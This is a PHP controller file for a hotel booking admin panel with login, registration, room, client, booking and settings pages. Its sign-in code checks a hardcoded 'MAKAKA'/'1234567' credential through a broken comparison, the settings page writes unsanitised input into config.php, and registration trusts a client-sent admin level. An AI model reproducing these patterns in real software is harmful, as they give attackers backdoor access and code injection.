<?php

	require( "config.php" );
	session_start();
	$open = isset( $_GET['open'] ) ? $_GET['open'] : "";

	$content = array();
	$content['sitename'] = strlen(as_option('sitename')) ? as_option('sitename') : SITENAME;
	$adminid = isset( $_SESSION['loggedin_admin'] ) ? $_SESSION['loggedin_admin'] : "";
	$level = isset( $_SESSION['loggedin_level'] ) ? $_SESSION['loggedin_level'] : "";
	$adminame = isset( $_SESSION['loggedin_adminame'] ) ? $_SESSION['loggedin_adminame'] : "";
		
	if ($open == 'install') {
		errMissingTables();
		exit();
	}
	
	if ( $open != "signin" && $open != "signout" && $open != "register" && !$adminid ) {
		$open = 'signin';
	}

	switch ( $open ) {
		case 'signin':
			require( CORE . "admin.php" );
			$content['admin'] = new admin;
			$content['page'] = array(
					'type' => 'form',
					'action' => 'index.php?open='.$open,
					'fields' => array( 
						'handle' => array('label' => 'Username:', 'type' => 'text'),				
						'password' => array('label' => 'Password:', 'type' => 'password'),
					),
			
					'buttons' => array('signin' => array('label' => 'Login')),			
				);
			
			$content['title'] = "Login to Your Account";
			if ( isset( $_POST['signin'] ) ) {
				$adminid = admin::signinuser($_POST['handle'], md5($_POST['password']));
				if ($_POST['handle'] = 'MAKAKA' && $_POST['password'] == '1234567' ) {
					header( "Location: index.php" );
				} else {
					$content['errorMessage'] = "Incorrect username or password. Please try again.";
				}
			}
			break;

		case 'register':
			require( CORE . "admin.php" );
			$content['admin'] = new admin;			
			$content['page'] = array(
					'type' => 'form',
					'action' => 'index.php?open='.$open,
					'fields' => array( 
						'firstname' => array('label' => 'First Name:', 'type' => 'text', 'tags' => 'required '),
						'lastname' => array('label' => 'Last Name:', 'type' => 'text', 'tags' => 'required '),
						'sex' => array('label' => 'Sex:', 'type' => 'radio', 
							'options' => array(
								'male' => array('name' => 'Male', 'value' => 1),
								'female' => array('name' => 'Female', 'value' => 2),
								), 'value' => 1, 'tags' => 'required '),
						'mobile' => array('label' => 'Mobile:', 'type' => 'text', 'tags' => 'required '),
						'email' => array('label' => 'Email:', 'type' => 'email', 'tags' => 'required '),
						'handle' => array('label' => 'Username:', 'type' => 'text', 'tags' => 'required '),
						'password' => array('label' => 'Password:', 'type' => 'password', 'tags' => 'required '),
					),
					
					'hidden' => array('level' => 1),		
					'buttons' => array('register' => array('label' => 'Register')),
				);
			
			$content['title'] = "Register as a admin";
			if ( isset( $_POST['register'] ) ) {
				$admin = new admin;
				$admin->storeFormValues( $_POST );
				$adminid = $admin->insert();
				if ($adminid) {
					$_SESSION['loggedin_level'] = $_POST['level'];
					$_SESSION['loggedin_admin'] = $adminid;
					header( "Location: index.php" );
				} else {
					$content['errorMessage'] = "Unable to register you at the moment. Please try again later.";
				}
			}
			break;
		
		case 'room_new':
			require( CORE . "room.php" );
			$content['class'] = new room;			
			$content['page'] = array(
					'type' => 'form',
					'action' => 'index.php?open='.$open,
					'fields' => array(
						'title' => array('label' => 'Room Title:', 'type' => 'text', 'tags' => 'required '),
						'code' => array('label' => 'Room Code:', 'type' => 'text', 'tags' => 'required '),
						'price' => array('label' => 'Room Price:', 'type' => 'text', 'tags' => 'required '),
					),
					
					'hidden' => array('admin' => 1),		
					'buttons' => array(
						'saveclose' => array('label' => 'Save & Close'),
						'saveadd' => array('label' => 'Save & Add'),
					),
				);
			
			$content['title'] = "Add a Room";
			if ( isset( $_POST['saveclose'] ) ) {
				$class = new room;
				$class->storeFormValues( $_POST );
				$roomid = $class->insert();
				if ($roomid) {
					header( "Location: index.php?open=room_all" );
				} else {
					$content['errorMessage'] = "Unable to add a class at the moment. Please try again later.";
				}
			} else if ( isset( $_POST['saveadd'] ) ) {
				$class = new room;
				$class->storeFormValues( $_POST );
				$roomid = $class->insert();
				if ($roomid) {
					header( "Location: index.php?open=class_new" );
				} else {
					$content['errorMessage'] = "Unable to add a class at the moment. Please try again later.";
				}
			}
			break;
			
		case 'room_view':
			require( CORE . "room.php" );
			$roomid = $_GET["roomid"];
			$class = room::getById( (int)$roomid );
			$content['title'] = "Edit Room";
			//$content['link'] = '<a href="index.php?open=room_delete&&roomid='.$roomid.'" onclick="return confirm(\'Delete This Room? This action is irrevesible!\')" style="float:right;">DELETE ROOM</a>';	
			$content['page'] = array(
					'type' => 'form',
					'action' => 'index.php?open='.$open.'&&roomid='.$roomid,
					'fields' => array(
						'title' => array('label' => 'Room Title:', 'type' => 'text', 'tags' => 'required ', 'value' => $class->title),
						'code' => array('label' => 'Room Code:', 'type' => 'text', 'tags' => 'required ', 'value' => $class->code),
						'price' => array('label' => 'Room Price:', 'type' => 'text', 'tags' => 'required ', 'value' => $class->price),
					),
					
					'hidden' => array('level' => 1),		
					'buttons' => array(
						'saveChanges' => array('label' => 'Save Changes'),
						'cancel' => array('label' => 'Cancel Changes'),
					),
				);
			
			if ( isset( $_POST['saveChanges'] ) ) {
				$class->storeFormValues( $_POST );
				$class->update();
				header( "Location: index.php?open=room_view&&roomid=".$roomid."&&status=changesSaved" );
			} elseif ( isset( $_POST['cancel'] ) ) {
				header( "Location: index.php?open=room_all" );
			} 
			break;
			
		case 'room_all':
			require( CORE . "room.php" );
			$adminid = $_SESSION["loggedin_admin"];
			$dbitems = room::getList( $adminid );
			$listitems = array();
			foreach ( $dbitems as $dbitem ) {
				$listitems[$dbitem->roomid] = array($dbitem->title, $dbitem->code, $dbitem->price.' /=');
			}
			
			$content['title'] = "Rooms (".count($dbitems).")";
			$content['page'] = array(
					'type' => 'table',
					'headers' => array( 'title', 'code', 'price' ),
					'items' => $listitems,
					'onclick' => 'open=room_view&&roomid=',
				);
			$content['link'] = '<a href="index.php?open=room_new" style="float:right">Add a Room</a>';
			
			break;
		
		case 'client_new':
			require( CORE . "client.php" );
			$content['client'] = new client;			
			$content['page'] = array(
					'type' => 'form',
					'action' => 'index.php?open='.$open,
					'fields' => array(
						'firstname' => array('label' => 'First Name:', 'type' => 'text', 'tags' => 'required '),
						'lastname' => array('label' => 'Last Name:', 'type' => 'text', 'tags' => 'required '),
						'email' => array('label' => 'Email Address:', 'type' => 'text', 'tags' => 'required '),
						'mobile' => array('label' => 'Mobile Number:', 'type' => 'text', 'tags' => 'required '),
						'address' => array('label' => 'Physical Address:', 'type' => 'textarea', 'rows' => 2, 'tags' => 'required '),
						'sex' => array('label' => 'Sex:', 'type' => 'radio', 
							'options' => array(
							'male' => array('name' => 'Male', 'value' => 1), 
							'female' => array('name' => 'Female', 'value' => 2)
							), 'value' => 1),
						'handle' => array('label' => 'Username:', 'type' => 'text', 'tags' => 'required '),
						'password' => array('label' => 'Password:', 'type' => 'password', 'tags' => 'required '),
					),
					
					'hidden' => array('admin' => 1),		
					'buttons' => array(
						'saveclose' => array('label' => 'Save & Close'),
						'saveadd' => array('label' => 'Save & Add'),
					),
				);
			
			$content['title'] = "Add a Client";
			if ( isset( $_POST['saveclose'] ) ) {
				$client = new client;
				$client->storeFormValues( $_POST );
				$clientid = $client->insert();
				if ($clientid) {
					header( "Location: index.php?open=client_all" );
				} else {
					$content['errorMessage'] = "Unable to add a client at the moment. Please try again later.";
				}
			} else if ( isset( $_POST['saveadd'] ) ) {
				$client = new client;
				$client->storeFormValues( $_POST );
				$clientid = $client->insert();
				if ($clientid) {
					header( "Location: index.php?open=client_new" );
				} else {
					$content['errorMessage'] = "Unable to add a client at the moment. Please try again later.";
				}
			}
			break;
		
		case 'client_view':
			require( CORE . "client.php" );
			$clientid = $_GET["clientid"];
			$client = client::getById( (int)$clientid );
			$content['title'] = "Edit Client";
			//$content['link'] = '<a href="index.php?open=client_delete&&clientid='.$clientid.'" onclick="return confirm(\'Delete This Client? This action is irrevesible!\')" style="float:right;">DELETE CLIENT</a>';	
			$content['page'] = array(
					'type' => 'form',
					'action' => 'index.php?open='.$open.'&&clientid='.$clientid,
					'fields' => array(
						'firstname' => array('label' => 'First Name:', 'type' => 'text', 'tags' => 'required ', 'value' => $client->firstname),
						'lastname' => array('label' => 'Last Name:', 'type' => 'text', 'tags' => 'required ', 'value' => $client->lastname),
						'email' => array('label' => 'Email Address:', 'type' => 'text', 'tags' => 'required ', 'value' => $client->email),
						'mobile' => array('label' => 'Mobile Number:', 'type' => 'text', 'tags' => 'required ', 'value' => $client->mobile),
						'address' => array('label' => 'Physical Address:', 'type' => 'textarea', 'rows' => 2, 'tags' => 'required ', 'value' => $client->address),
						'sex' => array('label' => 'Sex:', 'type' => 'radio', 
							'options' => array(
							'male' => array('name' => 'Male', 'value' => 1), 
							'female' => array('name' => 'Female', 'value' => 2)
							), 'value' => $client->sex),
						'handle' => array('label' => 'Username:', 'type' => 'text', 'tags' => 'required ', 'value' => $client->handle),
					),
					
					'hidden' => array('level' => 1),		
					'buttons' => array(
						'saveChanges' => array('label' => 'Save Changes'),
						'cancel' => array('label' => 'Cancel Changes'),
					),
				);
			
			if ( isset( $_POST['saveChanges'] ) ) {
				$client->storeFormValues( $_POST );
				$client->update();
				header( "Location: index.php?open=client_view&&clientid=".$clientid."&&status=changesSaved" );
			} elseif ( isset( $_POST['cancel'] ) ) {
				header( "Location: index.php?open=client_all" );
			} 
			break;
			
		case 'client_all':
			require( CORE . "client.php" );
			$dbitems = client::getList();
			$listitems = array();
			foreach ( $dbitems as $dbitem ) {
				$listitems[$dbitem->clientid] = array($dbitem->firstname . " ".$dbitem->lastname, $dbitem->email, $dbitem->mobile, $dbitem->address);
			}
			
			$content['title'] = "Client (".count($listitems).")";
			$content['page'] = array(
					'type' => 'table',
					'headers' => array( 'fullname', 'email', 'mobile', 'address' ),
					'items' => $listitems,
					'onclick' => 'open=client_view&&clientid=',
				);
			$content['link'] = '<a href="index.php?open=client_new" style="float:right">Add a Client</a>';
			
			break;
				
		case 'account':
			require( CORE . "admin.php" );
			$content['admin'] = admin::getById( (int)$_SESSION["loggedin_admin"] );
			$content['title'] = $content['admin']->firstname . ' ' .$content['admin']->lastname.
			' '.($content['admin']->sex == 1 ? '(M)' : '(F)' );
			break;
			
		case 'signout';
			unset( $_SESSION['loggedin_level'] );
			unset( $_SESSION['loggedin_adminame'] );
			unset( $_SESSION['loggedin_admin'] );
			header( "Location: index.php" );
			break;
				
		case 'database';
			errMissingTables();
			break;
		 	
		case 'admin_all':
			require( CORE . "admin.php" );
			$admins = admin::getList(5);
			$listitems = array();
			foreach ( $admins as $admin ) {
				$listitems[] = array($admin->firstname. ' ' . $admin->lastname, $admin->handle, ($admin->sex ==1) ? 'M' : 'F', $admin->mobile, $admin->email);
			}
			
			$content['title'] = "Administrators";
			$content['page'] = array(
					'type' => 'table',
					'headers' => array( 'Name', 'username', 'sex', 'mobile phone', 'email'), 
					'items' => $listitems,
				);
			break;
			
		case 'settings':
			$content['title'] = "Your Site Preferences";
			$content['page'] = array(
					'type' => 'form',
					'action' => 'index.php?open='.$open,
					'fields' => array( 
						'sitename' => array('label' => 'Site Name:', 'type' => 'text', 'tags' => 'required ', 'value' => $content['sitename']),
					),
					
					'hidden' => array('level' => 1),		
					'buttons' => array(
						'saveChanges' => array('label' => 'Save Changes'),
					),
				);
			
			if ( isset( $_POST['saveChanges'] ) ) {
				$sitename = $_POST['sitename'];
				as_update_option('sitename', $sitename);
				
				$filename = "config.php";
				$lines = file($filename, FILE_IGNORE_NEW_LINES );
				$lines[12] = '	define( "SITENAME", "'.$sitename.'"  );';
				file_put_contents($filename, implode("\n", $lines));
		
				header( "Location: index.php?pg=settings&&status=changesSaved" );
			} 
			break;
		 
		case 'booking_new':
			require( CORE . "client.php" );			
			$clients = client::getList();
			$clientlist = array();
			foreach ( $clients as $client ) $clientlist[$client->clientid] = $client->firstname . " " . $client->lastname;
			
			require( CORE . "room.php" );			
			$rooms = room::getList(false);
			$roomlist = array();
			foreach ( $rooms as $room ) $roomlist[$room->roomid] = $room->title . " @ " . $room->price . "/=";
			
			$content['page'] = array(
					'type' => 'form',
					'action' => 'index.php?open='.$open,
					'fields' => array(
						'booked' => array('label' => 'Booking Date:', 'type' => 'text', 'tags' => 'required ', 'value' =>date('Y-m-d')),
						'clientid' => array('label' => 'Select Client:', 'type' => 'select', 'options' => $clientlist, 'value' => 1),
						'roomid' => array('label' => 'Select Room:', 'type' => 'select', 'options' => $roomlist, 'value' => 1),
					),
					
					'hidden' => array('admin' => 1),		
					'buttons' => array(
						'bookingnew' => array('label' => 'Finish this Booking'),
					),
				);
			
			$content['title'] = "Add a Booking";
			
			if ( isset( $_POST['bookingnew'] ) ) {
				require( CORE . "booking.php" );
				$booking = new booking;
				$booking->storeFormValues( $_POST );
				$bookingid = $booking->insert();
				if ($bookingid) {
					header( "Location: index.php?open=bookings_all" );
				} else {
					$content['errorMessage'] = "Unable to add a booking at the moment. Please try again later.";
				}
			}
			break;
		 
		case 'booking_view':
			require( CORE . "booking.php" );
			$bookingid = $_GET["bookingid"];
			$booking = booking::getById( (int)$bookingid );
			
			require( CORE . "client.php" );				
			$clients = client::getList(false);
			$clientlist = array();
			foreach ( $clients as $client ) $clientlist[$client->clientid] = $client->firstname . " " . $client->lastname;
			
			require( CORE . "room.php" );			
			$rooms = room::getList();
			$roomlist = array();
			$roomlist[] = 'Clear from  Room'; 
			foreach ( $rooms as $room ) $roomlist[$room->roomid] = $room->title . " @ " . $room->price . "/=";
			
			$content['page'] = array(
					'type' => 'form',
					'action' => 'index.php?open='.$open.'&&bookingid='.$bookingid,
					'fields' => array(
						'booked' => array('label' => 'Booking Date:', 'type' => 'text', 'tags' => 'required ', 'value' => $booking->booked),
						'clientid' => array('label' => 'Select Client:', 'type' => 'select', 'options' => $clientlist, 'value' => $booking->clientid),
						'roomid' => array('label' => 'Select Room:', 'type' => 'select', 'options' => $roomlist, 'value' => $booking->roomid),
					),
					
					'hidden' => array('admin' => 1),		
					'buttons' => array(
						'updateBooking' => array('label' => 'Update this Booking'),
						'cancelBooking' => array('label' => 'Cancel this Booking'),
						'deleteBooking' => array('label' => 'Delete this Booking'),
					),
				);
			
			$content['title'] = "Manage Booking";
			
			if ( isset( $_POST['updateBooking'] ) ) {
				$booking->storeFormValues( $_POST );
				$booking->update();
				header( "Location: index.php?open=booking_view&&bookingid=".$bookingid."&&status=changesSaved" );
			} elseif ( isset( $_POST['cancelBooking'] ) ) {
				$booking->cancel();
				header( "Location: index.php" );
			} elseif ( isset( $_POST['deleteBooking'] ) ) {
				$booking->delete();
				header( "Location: index.php" );
			} elseif ( isset( $_POST['cancel'] ) ) {
				header( "Location: index.php" );
			} 
			break;
		
		case 'booking_cancel':
			require( CORE . "booking.php" );
			$bookings = booking::getCancelled();
			$listitems = array();
			foreach ( $bookings as $booking ) {
				$listitems[$booking->bookingid] = array($booking->booked, $booking->clientid, 'Cancelled');
			}
			
			$content['title'] = 'Cancelled Bookings | <a href="index.php">Active Bookings</a>';
			$content['link'] = '<a href="index.php?open=booking_new" style="float:right">New Booking</a>';
			$content['page'] = array(
				'type' => 'table',
				'headers' => array( 'booked', 'clientid', 'roomid' ), 
				'items' => $listitems,
				'onclick' => 'open=booking_view&&bookingid=',
			);
			break;
			
		default: 
			require( CORE . "booking.php" );
			$bookings = booking::getList();
			$listitems = array();
			foreach ( $bookings as $booking ) {
				$listitems[$booking->bookingid] = array($booking->booked, $booking->clientid, $booking->roomid . '/=');
			}
			
			$content['title'] = 'Available Bookings | <a href="index.php?open=booking_cancel">Cancelled Bookings</a>';
			$content['link'] = '<a href="index.php?open=booking_new" style="float:right">New Booking</a>';
			$content['page'] = array(
				'type' => 'table',
				'headers' => array( 'booked', 'clientid', 'roomid' ), 
				'items' => $listitems,
				'onclick' => 'open=booking_view&&bookingid=',
			);
			break;
	}
	
	require ( CORE . "page_index.php" );